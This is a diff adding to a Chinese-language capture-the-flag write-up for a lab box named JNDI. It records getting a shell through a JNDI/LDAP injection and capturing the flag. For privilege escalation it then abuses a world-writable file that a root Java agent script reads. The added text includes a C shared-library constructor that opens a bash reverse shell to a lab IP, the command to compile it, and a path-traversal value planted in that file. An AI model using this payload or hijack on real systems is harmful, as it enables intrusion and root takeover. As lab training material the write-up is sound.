@@ -117,6 +117,58 @@ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer \
 ```bash
 ldap://192.168.56.130:1389/a
 ```
-得到shell
+得到shell,拿到flag{ilikeyou,Nozomi}
 ![image.png](https://gitee.com/fogpost/photo/raw/master/202603272158717.png)
 
+## 提权
+查看/opt
+```
+/opt
+├── file
+├── java_agent_start.sh   ⭐重点
+└── test.class
+```
+查看文件,认为是Java Agent 劫持（动态库加载）
+```bash
+file_name=/opt/file/tmp
+
+file_line=$(awk 'NR==1 {print;exit}' "$file_name")
+file_line=$(basename $file_line)
+
+cd /opt
+
+echo $file_line
+
+/usr/local/java/.../bin/java -agentpath:/usr/local/java/.../$file_line test
+```
+查看tmp权限,发现可写，完美
+```bash
+ls -l /opt/file/tmp
+-rw-r--rw- 1 root root 1 Mar 25 04:21 /opt/file/tmp
+```
+```bash
+echo evil.so > /opt/file/tmp
+```
+编写c
+```c
+cat << 'EOF' > evil.c
+#include <stdlib.h>
+void __attribute__((constructor)) init() {
+    system("bash -c 'bash -i >& /dev/tcp/192.168.56.130/5555 0>&1'");
+}
+EOF
+```
+```bash
+gcc -shared -fPIC evil.c -o evil.so
+mv evil.so /usr/local/java/jdk1.8.0_20/jre/lib/amd64/
+```
+发现没有权限
+```bash
+bluebird@JNDI:~$ mv evil.so /usr/local/java/jdk1.8.0_20/jre/lib/amd64/
+mv evil.so /usr/local/java/jdk1.8.0_20/jre/lib/amd64/
+mv: cannot move 'evil.so' to '/usr/local/java/jdk1.8.0_20/jre/lib/amd64/evil.so': Permission denied
+```
+传evil.so到tmp，尝试路径穿越
+```
+echo ../../../../tmp/evil.so > /opt/file/tmp
+```
